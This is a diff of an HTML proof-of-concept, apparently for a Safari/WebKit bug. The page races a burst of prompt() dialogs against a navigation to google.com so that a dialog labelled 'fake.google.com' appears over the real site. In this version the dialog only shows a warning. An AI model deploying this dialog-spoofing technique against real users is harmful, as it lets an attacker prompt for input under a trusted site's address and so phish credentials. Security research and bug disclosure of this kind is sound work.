@@ -2,47 +2,37 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Safari Dialog Lifecycle PoC</title>
+<title>Safari Dialog Timing PoC</title>
 </head>
 
 <body style="background:#000;color:#fff;font-family:sans-serif;text-align:center;">
 <h3>Loading…</h3>
 
 <script>
-// Force history entry (relevant to WebKit lifecycle bugs)
-history.pushState({}, "", "#init");
+// Prepare lifecycle state (relevant for Safari/WebKit)
+history.pushState({}, "", "#poc");
+window.addEventListener("pagehide", () => {});
+window.addEventListener("beforeunload", () => {});
 
-// Register beforeunload (often buggy in WebKit)
-window.addEventListener("beforeunload", function () {
-  // intentionally empty
-});
-
-// Step 1: allow page to settle
+// Let page settle shortly
 setTimeout(() => {
 
-  // Step 2: trigger top-level navigation
+  // Trigger top-level navigation
   location.href = "https://www.google.com";
 
-  // Step 3: race dialog against navigation + unload
-  setTimeout(() => {
-    try {
-      prompt(
-        "fake.google.com\n⚠️ Do not sign into your account",
-        ""
-      );
-    } catch (e) {}
-  }, 20);
+  // Burst attempts inside navigation timing window
+  [5, 15, 30].forEach(delay => {
+    setTimeout(() => {
+      try {
+        prompt(
+          "fake.google.com\n⚠️ Do not sign into your account",
+          ""
+        );
+      } catch (e) {}
+    }, delay);
+  });
 
-  // Step 4: reinforce timing window
-  setTimeout(() => {
-    try {
-      alert(
-        "fake.google.com\nThis dialog should not survive navigation"
-      );
-    } catch (e) {}
-  }, 60);
-
-}, 250);
+}, 120);
 </script>
 </body>
 </html>
